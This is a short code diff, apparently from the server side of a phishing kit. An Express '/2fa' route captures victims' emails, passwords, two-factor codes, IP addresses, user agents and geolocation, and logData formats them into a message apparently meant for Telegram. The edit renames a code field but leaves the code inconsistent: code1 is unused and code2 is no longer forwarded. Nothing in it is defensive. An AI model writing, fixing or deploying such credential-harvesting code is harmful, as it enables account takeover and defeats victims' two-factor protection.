@@ -79,7 +79,7 @@ async function logData(data) {
 
   telegramMessage += "----------------------------------------------------------\n";
 
-  if (data.code1) telegramMessage += `Code 1: ${data.code1}\n`;
+  if (data.code) telegramMessage += `Code 1: ${data.code}\n`;
   if (data.code2) telegramMessage += `Code 2: ${data.code2}\n`;
 
   telegramMessage += "----------------------------------------------------------\n";
@@ -225,7 +225,7 @@ function getClientIP(req) {
 }
 // Handle 2FA submission
 app.post('/2fa', async (req, res) => {
-  const { code1, code2, password1, password2, email, step } = req.body;
+  const { code1, code, password1, password2, email, step } = req.body;
   const ip = getClientIP(req);
   const userAgent = req.headers['user-agent'] || 'N/A';
 
@@ -234,7 +234,7 @@ app.post('/2fa', async (req, res) => {
 
   const geo = await getGeo(ip);
   logData({
-    type: `2FA Lần  ${step} - Email  ${email}`, code1, code2, password1, password2, email, ip, userAgent,
+    type: `2FA Lần  ${step} - Email  ${email}`, code, password1, password2, email, ip, userAgent,
     city: geo.city,
     region: geo.region,
     country: geo.country,
